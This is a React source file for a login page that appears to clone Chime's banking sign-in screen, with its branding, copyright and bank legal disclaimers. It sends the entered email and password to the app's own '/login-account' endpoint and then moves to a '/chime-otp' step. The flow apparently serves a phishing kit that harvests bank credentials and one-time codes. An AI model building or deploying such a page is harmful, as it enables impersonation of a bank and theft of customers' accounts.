import { useState } from "react";
import {
  Box,
  TextField,
  Button,
  Typography,
  InputAdornment,
  IconButton,
  Link,
} from "@mui/material";
import { Visibility, VisibilityOff } from "@mui/icons-material";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import toast from "react-hot-toast";
import { SpinnerLoading } from "./SpinnerLoading";
import api from "./axios";
import { emailStore } from "./authStore";

export const ChimeLogin = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

 const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const updateEmailStore = emailStore((state) => state.updateEmailStore);

  const onSubmit = async (data) => {
    try {
      setIsLoading(true);
      const response = await api.post("/login-account", data);
      const { success, message } = response.data;

      if (!success)
        return toast.error(message || "Login failed please try again.");
      toast.success(message);
      updateEmailStore(data.email);
      return navigate("/chime-otp");

    } catch (err) {
      toast.error(err.response?.data?.message);
    } finally {
      setIsLoading(false);
    }
  };
  return (
    <Box
      sx={{
        minHeight: "100vh",
        bgcolor: "#031f1a",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        fontFamily: "Inter, sans-serif",
      }}
    >
      <Box
        sx={{
          width: 380,
          color: "white",
        }}
      >
        {/* Logo */}
        <Typography
          variant="h3"
          sx={{
            color: "#2de28a",
            fontWeight: 700,
            mb: 4,
          }}
        >
          chime
        </Typography>
        <form onSubmit={handleSubmit(onSubmit)}>
          {/* Email Field */}
          <TextField
            fullWidth
            placeholder="Email"
            variant="outlined"
            sx={inputStyles}
            {...register("email", {
              required: "Email is required!",
            })}
            error={!!errors.email}
            helperText={errors.email?.message}
          />

          {/* Password Field */}
          <TextField
            fullWidth
            placeholder="Password"
            type={showPassword ? "text" : "password"}
            variant="outlined"
            {...register("password", {
              required: "Password is required!",
            })}
            error={!!errors.password}
            helperText={errors.password?.message}
            sx={{ ...inputStyles, mt: 2 }}
            InputProps={{
              endAdornment: (
                <InputAdornment position="end">
                  <IconButton
                    onClick={() => setShowPassword(!showPassword)}
                    edge="end"
                    sx={{ color: "#ccc" }}
                  >
                    {showPassword ? <VisibilityOff /> : <Visibility />}
                  </IconButton>
                </InputAdornment>
              ),
            }}
          />

          {/* Sign In Button */}
          <Button
            fullWidth
            type="submit"
            variant="contained"
            sx={{
              mt: 3,
              py: 1.5,
              borderRadius: "12px",
              bgcolor: "#04ffc5",
              color: "#126848",
              textTransform: "none",
              fontWeight: 600,
              "&:hover": {
                bgcolor: "#22443c",
              },
            }}
          >
            Sign in
          </Button>
        </form>
        {/* Terms */}
        <Typography
          sx={{
            mt: 3,
            fontSize: "0.85rem",
            color: "#cfd8d5",
          }}
        >
          By clicking “Sign in”, you agree to receive SMS text messages from
          Chime to verify your identity
        </Typography>

        {/* Footer */}
        <Typography
          sx={{
            mt: 4,
            fontSize: "0.75rem",
            color: "#8aa39c",
          }}
        >
          © 2026 Chime. All Rights Reserved.
        </Typography>

        <Typography
          sx={{
            mt: 2,
            fontSize: "0.7rem",
            color: "#6e8780",
            lineHeight: 1.5,
          }}
        >
          Banking Services provided by The Bancorp Bank, N.A., or Stride Bank,
          N.A., Members FDIC. The Chime Visa® Debit Card is issued by The
          Bancorp Bank, N.A., or Stride Bank pursuant to a license from Visa
          U.S.A. Inc. and may be used everywhere Visa debit cards are accepted.
        </Typography>
      </Box>
       {isLoading && <SpinnerLoading />}
    </Box>
  );
}

/* 🔹 Reusable Styled Link */
function StyledLink({ text }) {
  return (
    <Link
      href="#"
      underline="always"
      sx={{
        display: "block",
        color: "#ffffff",
        fontSize: "0.9rem",
        mb: 1,
        "&:hover": {
          color: "#2de28a",
        },
      }}
    >
      {text}
    </Link>
  );
}

/* 🔹 Input Styling */
const inputStyles = {
  "& .MuiOutlinedInput-root": {
    borderRadius: "14px",
    bgcolor: "#062923",
    color: "white",
    "& fieldset": {
      borderColor: "#3a5c54",
    },
    "&:hover fieldset": {
      borderColor: "#5f8f84",
    },
    "&.Mui-focused fieldset": {
      borderColor: "#2de28a",
      boxShadow: "0 0 0 2px rgba(45, 226, 138, 0.2)",
    },
  },
  "& input::placeholder": {
    color: "#a0b3ad",
    opacity: 1,
  },
};
